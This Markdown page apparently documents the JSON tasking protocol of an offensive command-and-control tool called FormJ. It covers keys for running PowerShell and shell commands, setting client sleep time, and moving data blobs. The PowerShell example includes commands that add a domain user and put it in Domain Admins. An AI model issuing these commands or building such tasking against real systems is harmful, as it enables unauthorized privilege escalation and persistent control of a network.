# FormJKeys (move to formj md?)

There are a variety of sync keys used with FormJ

# Commands/Offensive

These keys correlate directly to commands run in the shell.

## powershell:

Runs powershell

Attributes:

`command`: Command to run

```
{
  "data": {
    "Powershell": [
      {
        "command": "net user /domain add bob"
      },
      {
        "command": "net group /add Domain Admins bob"
      }
    ],
  },
  "message": "",
  "rid": "b2bae39a-e395-4c71-afc7-8dfb16bb387d",
  "status": 200,
  "timestamp": 1724730258
}
```

## command
Runs a command with something such as os.system or subprocess

Attributes:

`command`: Command to run

```
{
  "data": {
    "command": [
      {
        "command": "whoami"
      },
    ],
  },
  "message": "",
  "rid": "b2bae39a-e395-4c71-afc7-8dfb16bb387d",
  "status": 200,
  "timestamp": 1724730258
}
```

## sleep
Tells client to set new sleep time for X seconds

Attributes:

`sleep`: Command to run

```
{
  "data": {
    "sleep": [
      {
        "time": "10"
      },
    ],
  },
  "message": "",
  "rid": "b2bae39a-e395-4c71-afc7-8dfb16bb387d",
  "status": 200,
  "timestamp": 1724730258
}

```


# Utility/data transfer

For other things, there's some keys that do some work behind the scenes

## blob
Carries a blob of data. Useful for moving data around, or just responses from clients. 


Attributes:

`encoding`: Type of encoding that the data is in

`data`: The data itself

`size`: size of the data field. 

```
{
  "data": {
    "blob": [
      {
        "encoding": "text",
        "data": "aaaaaaaahhhhh",
        "size": "1234"
      },
      {
        "encoding": "text",
        "data": "ahhhhhhhhhhhhh",
        "size": "1234"
      }
    ]
  },
  "message": "",
  "rid": "12345-56789-09187",
  "status": 200,
  "timestamp": 1724730258
}
     



```